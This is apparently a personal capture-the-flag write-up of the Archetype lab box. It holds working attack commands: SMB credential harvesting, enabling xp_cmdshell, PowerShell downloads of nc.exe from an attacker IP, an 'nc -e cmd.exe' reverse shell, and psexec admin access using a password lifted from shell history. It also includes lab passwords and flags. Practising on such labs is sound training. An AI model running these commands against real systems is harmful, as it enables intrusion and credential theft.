# TIER 2 STARTING POINT BOXES

--------------------------------------------------------------------

**TOOLS USED**: nmap, smbclient, impacket, netcat, winPEAS

**nmap**: network exploration tool and security / port scanner<br>

```
nmap [Scan Type...] [Options] {target specification}
```

Scan Types:<br>
-Ss [DEFAULT] TCP SYN Scan (Doesn't open full TCP connection)<br>
-St TCP Scan (Opens full TCP connection)<br>
-Su UDP Scan<br>

-Sc script scan
-sV probe for service/version info
-oN save output to file
-p- scan all ports

**smbclient**: ftp-like client to access SMB/CIFS resources on servers

```
smbclient [-M|--message=HOST] [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST] [-T|--tar=<c|x>IXFvgbNan] [-D|--directory=DIR] [-b|--send-buffer=BYTES]
       [-t|--timeout=SECONDS] [-p|--port=PORT] [-g|--grepable] [-q|--quiet] [-B|--browse] [-?|--help] [--usage] [-d|--debuglevel=DEBUGLEVEL] [--debug-stdout]
       [-s|--configfile=CONFIGFILE] [--option=name=value] [-l|--log-basename=LOGFILEBASE] [--leak-report] [--leak-report-full] [-R|--name-resolve=NAME-RESOLVE-ORDER]
       [-O|--socket-options=SOCKETOPTIONS] [-m|--max-protocol=MAXPROTOCOL] [-n|--netbiosname=NETBIOSNAME] [--netbios-scope=SCOPE] [-W|--workgroup=WORKGROUP] [--realm=REALM]
       [-U|--user=[DOMAIN/]USERNAME%[PASSWORD]] [-N|--no-pass] [--password=STRING] [--pw-nt-hash] [-A|--authentication-file=FILE] [-P|--machine-pass] [--simple-bind-dn=DN]
       [--use-kerberos=desired|required|off] [--use-krb5-ccache=CCACHE] [--use-winbind-ccache] [--client-protection=sign|encrypt|off] [-V|--version] [-c|--command=STRING]
```

**Impacket Colletion**: collection of python classes for working with network protocols

mssqlclient.py - establish authenticated connection to MS SQL
psexec.py - exploit writable shares on samba and start admin reverse shell

**netcat**: networking utility for reading and writing to network connections using TCP/IP

```
nc [-options] hostname port[s] [ports] ...
nc -l -p port [-options] [hostname] [port]
```

-n suppress name/port resolutions
-l listen mode
-v verbose
-p port

**winpeas**: script that searches for possible paths to escalate privileges on windows hosts

--------------------------------------------------------------------

**WINDOWS CMDs**:<br>
dir --> ls<br>
type --> cat<br>

--------------------------------------------------------------------

## ARCHETYPE BOX

**TOOLS USED**: nmap, smbclient, impacket

**IP Address**: 10.129.100.57

```
nmap -sC -sV -p- -oN archetype_nmap.txt 10.129.100.57
```

**EXPOSED PORT (SERVICE)**:<br>
135 (msrpc)<br>
139 (netbios-ssn)<br>
445 (microsoft-ds)<br>
1433 (ms-sql-s)<br>
5985 (http)<br>
47001 (http)<br>
49664 (msrpc)<br>
49665 (msrpc)<br>
49666 (msrpc)<br>
49667 (msrpc)<br>
49668 (msrpc)<br>
49669 (msrpc)<br>

USER: guest

```
smbclient -N -L 10.129.100.57
```

SHARES:<br>
ADMIN$<br>
backups<br>
C$<br>
IPC$<br>

TARGET SHARE: backups (non-administrative because no $ so no password required)

```
smbclient //10.129.100.57/backups -U guest
> get prod.dtsConfig
```

USER: ARCHETYPE\sql_svc
PASSWORD: M3g4c0rp123

To establish authenticated connection to MS SQL:
```
mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.100.57 -windows-auth
> enable_xp_cmdshell
> reconfigure
```

Get exe file from host:
```
cd /opt/exe
sudo python3 -m http.server 80
```
```
> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.102/nc.exe -outfile nc.exe"
> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.102/winPEASx64.exe -outfile winPEAS.exe"
```

Start a reverse shell:
```
nc -nlvp 4444  
```
```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; ./nc.exe -e cmd.exe 10.10.14.102 4444"
```

C:\Users\sql_svc\Desktop\user.txt: 3e7b102e78218e935bf3f4951fec21a3

Priveledge Escalation:
```
> .\winPEAS.exe
```

PRIV ESC TARGET: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

FILE CONTENT: net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!

PASSWORD: MEGACORP_4dm1n!!

Exploit writable shares on samba and start admin reverse shell:
```
sudo python3 psexec.py administrator@10.129.100.57
```

FLAG: b91ccec3305e98240082d4474b848528
